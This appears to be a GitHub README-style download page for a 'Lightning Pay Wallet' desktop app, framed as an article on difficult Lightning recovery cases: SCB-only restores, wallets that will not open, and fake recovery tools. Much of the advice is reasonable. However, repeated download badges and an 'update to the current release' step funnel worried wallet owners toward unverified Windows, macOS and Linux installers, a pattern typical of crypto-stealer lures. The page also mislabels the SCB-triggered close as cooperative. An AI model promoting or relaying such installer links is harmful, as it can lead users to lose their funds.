<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>

# When a Lightning recovery fails: no seed, an SCB, or an unsupported restore

The hard cases, what they actually mean, and the tools that are traps.

<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe">lightning-pay-wallet-windows-v1.2.1.exe</a> |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg">lightning-pay-wallet-macos-v1.2.1.dmg</a> |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip">lightning-pay-wallet-linux-v1.2.1.zip</a> |

</div>

Every file above is published on <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the Lightning Pay Wallet release page</a> under the same names, and that page is the only place the installers should come from.

> **Only download from this GitHub release page.**

Most recovery questions have an easy answer. This page is about the three that do not: a wallet that
will not open without a phrase, a restore with only a channel backup, and a channel that no other
wallet seems able to rebuild.

## No seed, SCB only

A static channel backup describes a channel well enough for a counterparty to force a close on your
behalf. It is not a wallet and it does not contain the keys. Restoring with an SCB and no phrase is
therefore not possible: the backup is an instruction for a node that still holds your keys, not a
replacement for them.

What an SCB can do is trigger a cooperative-looking close and return the balance on-chain, when the
counterparty is reachable and the wallet that holds the keys is the one using it.

## A wallet that will not open

A wallet file that fails to open is usually a corrupted installation or a moved data directory, not a
lost wallet. Before reinstalling, update to <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1">the current release</a>,
look for the phrase, and check whether the wallet can be pointed at its old data path.

Reinstalling is the destructive step, not the diagnostic one. If the phrase exists, a reinstall is
recoverable; if it does not, it is the moment the funds are actually lost.

## "No other wallet can restore it"

Lightning channels are specific to the wallet and counterparty that created them. A phrase that
restores on-chain funds in a different wallet may not rebuild the channels, because the other wallet
does not know the channel states or how to ask the counterparty for a close.

That is not a sign the funds are gone. It is a sign that the restore needs the original wallet, or a
tool that implements the same channel protocol. Which is why the channel backup and the phrase belong
together, in the same safe place.

## Graphical recovery tools

Treat every offer with suspicion. A legitimate tool never needs your phrase sent anywhere: the restore
happens locally. A site that asks you to paste a phrase, a keystore or a backup into a web form is
collecting wallets, and the loss is immediate and irreversible.

The test is simple: if the tool wants the secret in a browser, it is theft.

## What to do instead

Work in this order: find the phrase, find the channel backup, use the same wallet version, restore
offline, and only then consider third-party tools, with the machine disconnected and the phrase never
entered anywhere but the wallet itself.

## Questions people ask

### Can an SCB alone recover funds?

Not by itself. It needs the keys, which come from the phrase.

### Is there a recovery service that can help?

No legitimate one asks for a phrase. Recovery is local or it is theft.

### My channel is stuck closing. Are the funds gone?

Usually not. A forced close has a waiting period before funds are spendable, which can look like a
failure for days.

## Related guides

- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/back-up-a-lightning-wallet.md">Backing up a Lightning wallet: the seed phrase and the SCB file</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/recover-a-bitcoin-wallet-with-a-seed-phrase.md">Recovering a bitcoin wallet with a seed phrase</a>
- <a href="https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/recover-an-old-bitcoin-wallet.md">Recovering an old bitcoin wallet, or importing one you already have</a>

